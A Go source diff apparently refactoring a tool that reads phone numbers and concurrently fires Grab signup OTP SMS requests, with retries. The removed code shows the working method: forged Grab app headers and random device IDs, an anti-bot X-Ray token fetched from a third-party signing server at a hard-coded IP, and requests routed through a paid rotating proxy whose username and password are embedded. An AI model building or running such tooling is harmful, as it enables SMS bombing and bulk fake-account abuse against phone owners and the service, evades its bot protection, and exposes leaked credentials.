@@ -2,35 +2,17 @@ package main
 
 import (
 	"bufio"
-	"bytes"
-	"crypto/sha256"
-	"encoding/hex"
-	"encoding/json"
 	"fmt"
-	"io/ioutil"
-	"math/rand"
-	"net/http"
-	"net/url"
 	"os"
 	"os/signal"
 	"strings"
-	"sync"
 	"syscall"
-	"time"
 
 	"concurrentrix/config"
+	"concurrentrix/core"
+	"concurrentrix/core/tools"
+	"concurrentrix/internal"
 	"concurrentrix/record"
-)
-
-var (
-	SuccessPhones = make(chan string, config.ChanNum)
-	FailPhones    = make(chan string, config.ChanNum)
-	AgainPhones   = make(chan *AgainSendPool, config.ChanNum)
-	MutexSendJobs sync.Mutex
-	MutexUseJobs  sync.Mutex
-	MutexAgainNum sync.Mutex
-	SendJobs      = 0
-	AgainNum      = 0
 )
 
 func main() {
@@ -42,8 +24,8 @@ func main() {
 	}
 
 	useJobs := len(phones)
-	go record.WriteSuccessPhone(SuccessPhones, &MutexUseJobs, &useJobs)
-	go record.WriteFailPhone(FailPhones, &MutexUseJobs, &useJobs)
+	go record.WriteSuccessPhone(core.SuccessPhones, &core.MutexUseJobs, &useJobs)
+	go record.WriteFailPhone(core.FailPhones, &core.MutexUseJobs, &useJobs)
 
 	phoneJobs := make(chan string)
 
@@ -66,18 +48,18 @@ func main() {
 		fmt.Printf("\n received interrupt signal. exiting... \n")
 		// Use the lastPhone variable here
 		fmt.Printf("Last phone received: %s\n", lastPhone)
-		close(SuccessPhones)
-		close(FailPhones)
-		close(AgainPhones)
+		close(core.SuccessPhones)
+		close(core.FailPhones)
+		close(core.AgainPhones)
 		close(phoneJobs)
 		os.Exit(1)
 	}()
 
 	for {
-		if SendJobs == len(phones) && useJobs == 0 && AgainNum == 0 {
-			close(SuccessPhones)
-			close(FailPhones)
-			close(AgainPhones)
+		if core.SendJobs == len(phones) && useJobs == 0 && core.AgainNum == 0 {
+			close(core.SuccessPhones)
+			close(core.FailPhones)
+			close(core.AgainPhones)
 			close(phoneJobs)
 			fmt.Printf("Last phone received: %s\n", lastPhone)
 			os.Exit(1)
@@ -89,66 +71,61 @@ func threadSend(jobs chan string) {
 	go func() {
 		for {
 			phone := <-jobs
-			xRay, err := getXRay(getPhoneSha256(phone))
+			xRay, err := core.GetXRay(tools.GetPhoneSha256(phone))
 			if err != nil {
 				fmt.Print(err.Error())
 				return
 			}
 			fmt.Printf("============ START SEND PHONE{%v}=============\n", phone)
-			err = smsSend(phone, xRay)
+			err = core.SmsSend(phone, xRay)
 			if err != nil {
 				if config.SendTimes == 0 {
-					FailPhones <- phone
+					core.FailPhones <- phone
 				} else {
-					ap := &AgainSendPool{
-						phone: phone,
+					ap := &internal.AgainSendPool{
+						Phone: phone,
 					}
 					ap.Frequency++
-					AgainPhones <- ap
-					MutexAgainNum.Lock()
-					AgainNum++
-					MutexAgainNum.Unlock()
+					core.AgainPhones <- ap
+					core.MutexAgainNum.Lock()
+					core.AgainNum++
+					core.MutexAgainNum.Unlock()
 				}
 				fmt.Printf("%v\n", err)
 			}
-			MutexSendJobs.Lock()
-			SendJobs++
-			MutexSendJobs.Unlock()
+			core.MutexSendJobs.Lock()
+			core.SendJobs++
+			core.MutexSendJobs.Unlock()
 		}
 	}()
-}
-
-type AgainSendPool struct {
-	phone     string
-	Frequency int
 }
 
 func againSend() {
 	go func() {
 		for {
-			agPh := <-AgainPhones
-			MutexAgainNum.Lock()
-			AgainNum--
-			MutexAgainNum.Unlock()
-			xRay, err := getXRay(getPhoneSha256(agPh.phone))
+			agPh := <-core.AgainPhones
+			core.MutexAgainNum.Lock()
+			core.AgainNum--
+			core.MutexAgainNum.Unlock()
+			xRay, err := core.GetXRay(tools.GetPhoneSha256(agPh.Phone))
 			if err != nil {
 				fmt.Print(err.Error())
 				return
 			}
 			if agPh.Frequency == config.SendTimes {
-				FailPhones <- agPh.phone
+				core.FailPhones <- agPh.Phone
 			} else {
-				fmt.Printf("============ {%d} AGAIN START SEND PHONE{%v}=============\n", agPh.Frequency, agPh.phone)
-				err = smsSend(agPh.phone, xRay)
+				fmt.Printf("============ {%d} AGAIN START SEND PHONE{%v}=============\n", agPh.Frequency, agPh.Phone)
+				err = core.SmsSend(agPh.Phone, xRay)
 				if err != nil {
 					fmt.Printf("%v\n", err)
-					AgainPhones <- &AgainSendPool{
-						phone:     agPh.phone,
+					core.AgainPhones <- &internal.AgainSendPool{
+						Phone:     agPh.Phone,
 						Frequency: agPh.Frequency + 1,
 					}
-					MutexAgainNum.Lock()
-					AgainNum++
-					MutexAgainNum.Unlock()
+					core.MutexAgainNum.Lock()
+					core.AgainNum++
+					core.MutexAgainNum.Unlock()
 				}
 			}
 		}
@@ -181,184 +158,4 @@ func readPhone() (phones []string, err error) {
 		return
 	}
 	return
-}
-
-// Coded as Base64
-func getPhoneSha256(strToHash string) string {
-	// First SHA-256 hash
-	sha256Hash := sha256.New()
-	sha256Hash.Write([]byte(strToHash))
-	hashedStr := sha256Hash.Sum(nil)
-	hashedStrHex := hex.EncodeToString(hashedStr)
-
-	// Second SHA-256 hash
-	sha256Hash = sha256.New()
-	sha256Hash.Write([]byte(hashedStrHex))
-	digest := sha256Hash.Sum(nil)
-	hexDigest := hex.EncodeToString(digest)
-
-	return hexDigest
-}
-
-// Gain Authorization
-func getPhoneSha256s(strToHash string) string {
-	sha256Hash := sha256.New()
-	sha256Hash.Write([]byte(strToHash))
-	hashedStr := sha256Hash.Sum(nil)
-	hashedStrHex := hex.EncodeToString(hashedStr)
-	return hashedStrHex
-}
-
-var smsSendUrl = "https://api.grab.com/grabid/v1/phone/otp"
-var getXRayUrl = "http://154.221.17.198:5612/business/invoke?group=huoyu_test&action=nb&arg1="
-var tunnel = "i635.kdltps.com:15818"
-var username = "t10407739755674"
-var password = "op1un18b"
-
-type xRayStr struct {
-	ClientID string
-	Data     string
-	Message  interface{}
-}
-
-func getXRay(enco string) (string, error) {
-	resp, err := http.Get(getXRayUrl + enco)
-	if err != nil {
-		err = fmt.Errorf("http get err: %v", err)
-		return "", err
-	}
-	defer resp.Body.Close()
-
-	// Read the response body
-	var result *xRayStr
-	decoder := json.NewDecoder(resp.Body)
-	err = decoder.Decode(&result)
-	if err != nil {
-		err = fmt.Errorf("decode err: %v", err)
-		return "", err
-	}
-
-	return result.Data, nil
-}
-
-func generateRandomDriverID() string {
-	// Setting the random number seed
-	rand.Seed(time.Now().UnixNano())
-
-	// Generate random numbers between 1000 and 9999
-	randomNumber := rand.Intn(9000) + 1000
-
-	// Generate driver_id with a fixed suffix
-	driverID := fmt.Sprintf("%d%s", randomNumber, "c6509c1db2d1")
-
-	return driverID
-}
-
-func smsSend(phone, xRay string) error {
-	// Constructing the request header
-	headers := map[string]string{
-		"Connection":           "close",
-		"X-Ray":                xRay,
-		"X-Grab-Device-ID":     generateRandomDriverID(),
-		"alias_sessionid":      "2312271214-0yu1VjiyG9gadd" + xRay,
-		"x-request-id":         fmt.Sprintf("%s", time.Now().UnixNano()),
-		"X-Grab-Device-Model":  "Pixel 4 XL",
-		"Authorization":        "grabsecure " + getPhoneSha256s(phone),
-		"Accept-Language":      "zh-CN;q=1.0, en-US;q=0.9, en;q=0.8",
-		"X-Translate-Language": "",
-		"User-Agent":           "Grab/5.285.0 (Android 10; Build 62826273)",
-		"Content-Type":         "application/json; charset=UTF-8",
-		"Host":                 "api.grab.com",
-		"accept-encoding":      "gzip",
-	}
-
-	// Constructing the request body
-	payload := map[string]interface{}{
-		"method":                  "SMS",
-		"countryCode":             "cn",
-		"phoneNumber":             phone,
-		"templateID":              "pax_android_production",
-		"numDigits":               6,
-		"deviceID":                generateRandomDriverID(),
-		"deviceManufacturer":      "Google",
-		"deviceModel":             "Pixel 4 XL",
-		"cellularOperator":        "",
-		"locale":                  "en-KW",
-		"retryCount":              0,
-		"eligibleForAccountHints": "false",
-		"adrID":                   nil,
-		"adrIMEI":                 nil,
-		"adrIMSI":                 nil,
-		"adrMEID":                 nil,
-		"adrSERIAL":               nil,
-		"adrUDID":                 nil,
-		"advertisingID":           nil,
-		"scenario":                "signup",
-	}
-
-	// Convert request body to JSON
-	jsonPayload, err := json.Marshal(payload)
-	if err != nil {
-		err = fmt.Errorf("JSON encoding error:%v", err)
-		return err
-	}
-
-	// Send a POST request
-	req, err := http.NewRequest("POST", smsSendUrl, bytes.NewBuffer(jsonPayload))
-	if err != nil {
-		err = fmt.Errorf("create request error:%v", err)
-		return err
-	}
-
-	// Setting the request header
-	for key, value := range headers {
-		req.Header.Set(key, value)
-	}
-
-	// Setting up the proxy
-	proxyURL := fmt.Sprintf("http://%s:%s@%s/", username, password, tunnel)
-	parsedProxyURL, err := url.Parse(proxyURL)
-	if err != nil {
-		err = fmt.Errorf("parsing proxy URL error: %v", err)
-		return err
-	}
-	transport := &http.Transport{Proxy: http.ProxyURL(parsedProxyURL)}
-	client := &http.Client{Transport: transport}
-
-	// Send request
-	response, err := client.Do(req)
-	if err != nil {
-		err = fmt.Errorf("send request error: %v", err)
-		return err
-	}
-	defer response.Body.Close()
-
-	// Read the response body
-	body, _ := ioutil.ReadAll(response.Body)
-	if err != nil {
-		err = fmt.Errorf("error reading response body: %v", err)
-		return err
-	}
-
-	// Printing response results
-	fmt.Printf("Response results: %s\n", body)
-	if response.StatusCode == http.StatusOK {
-		if bytes.Contains(body, []byte("challengeID")) {
-			SuccessPhones <- phone
-			fmt.Printf("phone:%s send success\n", phone)
-		} else {
-			ap := &AgainSendPool{
-				phone: phone,
-			}
-			ap.Frequency++
-			AgainPhones <- ap
-			MutexAgainNum.Lock()
-			AgainNum++
-			MutexAgainNum.Unlock()
-			fmt.Printf("phone:%s send error。%s\n", phone, body)
-		}
-	} else {
-		err = fmt.Errorf("phone:%s send error。Status Code: %d\n", phone, response.StatusCode)
-	}
-	return err
 }
